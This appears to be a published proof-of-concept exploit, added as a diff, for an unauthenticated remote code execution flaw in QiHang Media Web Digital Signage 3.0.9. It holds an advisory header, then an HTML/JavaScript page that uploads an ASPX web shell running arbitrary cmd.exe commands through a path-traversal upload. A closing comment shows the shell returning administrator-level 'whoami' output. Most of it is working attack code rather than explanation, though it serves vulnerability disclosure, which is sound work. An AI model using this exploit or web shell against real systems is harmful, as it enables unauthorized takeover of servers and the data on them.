@@ -1,0 +1,138 @@
+# Exploit Title: QiHang Media Web Digital Signage 3.0.9 - Remote Code Execution (Unauthenticated)
+# Date: 2020-08-12
+# Exploit Author: LiquidWorm
+# Vendor Homepage: http://www.howfor.com
+# Tested on: Microsoft Windows Server 2012 R2 Datacenter
+# CVE : N/A
+
+<!--
+
+QiHang Media Web (QH.aspx) Digital Signage 3.0.9 (pre-auth) Remote Code Execution
+
+
+Vendor: Shenzhen Xingmeng Qihang Media Co., Ltd.
+        Guangzhou Hefeng Automation Technology Co., Ltd.
+Product web page: http://www.howfor.com
+Affected version: 3.0.9.0
+
+Summary: Digital Signage Software.
+
+Desc: The application suffers from an unauthenticated remote code execution.
+The vulnerability is caused due to lack of verification when uploading files
+with QH.aspx that can be written in any location by utilizing the 'remotePath'
+parameter to traverse through directories. Abusing the upload action and the
+'fileToUpload' parameter, an unauthenticated attacker can exploit this to
+execute system commands by uploading a malicious ASPX script.
+
+Tested on: Microsoft Windows Server 2012 R2 Datacenter
+           Microsoft Windows Server 2003 Enterprise Edition
+           ASP.NET 4.0.30319
+           HowFor Web Server/5.6.0.0
+           Microsoft ASP.NET Web QiHang IIS Server
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5582
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5582.php
+
+
+27.07.2020
+
+-->
+
+
+<html>
+  <body>
+    <script>
+      function uploadShellPoC()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http:\/\/192.168.1.74:8090\/QH.aspx", true);
+        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=----WebKitFormBoundaryhbcZX7o0Hw19h3kr");
+        xhr.setRequestHeader("Accept", "*\/*");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
+        xhr.withCredentials = true;
+        var body = "------WebKitFormBoundaryhbcZX7o0Hw19h3kr\r\n" + 
+          "Content-Disposition: form-data; name=\"fileToUpload\"; filename=\"cmd.aspx\"\r\n" + 
+          "Content-Type: application/octet-stream\r\n" + 
+          "\r\n" + 
+          "\x3c%@ Page Language=\"VB\" Debug=\"true\" %\x3e\r\n" + 
+          "\x3c%@ import Namespace=\"system.IO\" %\x3e\r\n" + 
+          "\x3c%@ import Namespace=\"System.Diagnostics\" %\x3e\r\n" + 
+          "\r\n" + 
+          "\x3cscript runat=\"server\"\x3e\r\n" + 
+          "\r\n" + 
+          "Sub RunCmd(Src As Object, E As EventArgs)\r\n" + 
+          "  Dim myProcess As New Process()\r\n" + 
+          "  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)\r\n" + 
+          "  myProcessStartInfo.UseShellExecute = false\r\n" + 
+          "  myProcessStartInfo.RedirectStandardOutput = true\r\n" + 
+          "  myProcess.StartInfo = myProcessStartInfo\r\n" + 
+          "  myProcessStartInfo.Arguments=xcmd.text\r\n" + 
+          "  myProcess.Start()\r\n" + 
+          "\r\n" + 
+          "  Dim myStreamReader As StreamReader = myProcess.StandardOutput\r\n" + 
+          "  Dim myString As String = myStreamReader.Readtoend()\r\n" + 
+          "  myProcess.Close()\r\n" + 
+          "  mystring=replace(mystring,\"\x3c\",\"<\")\r\n" + 
+          "  mystring=replace(mystring,\"\x3e\",\">\")\r\n" + 
+          "  result.text= vbcrlf & \"\x3cpre\x3e\" & mystring & \"\x3c/pre\x3e\"\r\n" + 
+          "End Sub\r\n" + 
+          "\r\n" + 
+          "\x3c/script\x3e\r\n" + 
+          "\r\n" + 
+          "\x3chtml\x3e\r\n" + 
+          "\x3cbody\x3e\r\n" + 
+          "\x3cform runat=\"server\"\x3e\r\n" + 
+          "\x3cp\x3e\x3casp:Label id=\"L_p\" runat=\"server\" width=\"80px\"\x3eProgram\x3c/asp:Label\x3e\r\n" + 
+          "\x3casp:TextBox id=\"xpath\" runat=\"server\" Width=\"300px\"\x3ec:\\windows\\system32\\cmd.exe\x3c/asp:TextBox\x3e\r\n" + 
+          "\x3cp\x3e\x3casp:Label id=\"L_a\" runat=\"server\" width=\"80px\"\x3eArguments\x3c/asp:Label\x3e\r\n" + 
+          "\x3casp:TextBox id=\"xcmd\" runat=\"server\" Width=\"300px\" Text=\"/c net user\"\x3e/c net user\x3c/asp:TextBox\x3e\r\n" + 
+          "\x3cp\x3e\x3casp:Button id=\"Button\" onclick=\"runcmd\" runat=\"server\" Width=\"100px\" Text=\"Run\"\x3e\x3c/asp:Button\x3e\r\n" + 
+          "\x3cp\x3e\x3casp:Label id=\"result\" runat=\"server\"\x3e\x3c/asp:Label\x3e\r\n" + 
+          "\x3c/form\x3e\r\n" + 
+          "\x3c/body\x3e\r\n" + 
+          "\x3c/html\x3e\r\n" + 
+          "------WebKitFormBoundaryhbcZX7o0Hw19h3kr\r\n" + 
+          "Content-Disposition: form-data; name=\"action\"\r\n" + 
+          "\r\n" + 
+          "upload\r\n" + 
+          "------WebKitFormBoundaryhbcZX7o0Hw19h3kr\r\n" + 
+          "Content-Disposition: form-data; name=\"responderId\"\r\n" + 
+          "\r\n" + 
+          "ResourceNewResponder\r\n" + 
+          "------WebKitFormBoundaryhbcZX7o0Hw19h3kr\r\n" + 
+          "Content-Disposition: form-data; name=\"remotePath\"\r\n" + 
+          "\r\n" + 
+          "/opt/resources\r\n" + 
+          "------WebKitFormBoundaryhbcZX7o0Hw19h3kr--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Click" onclick="uploadShellPoC();" />
+    </form>
+  </body>
+</html>
+
+<!--
+JSON response for successful upload:
+{
+  "first": true,
+  "second": [
+    "cmd.aspx"
+  ]
+}
+
+GET request: http://192.168.1.74:8090/opt/resources/cmd.aspx
+Command issued: /c whoami
+
+Response:
+robertovolare\administrator
+ -->
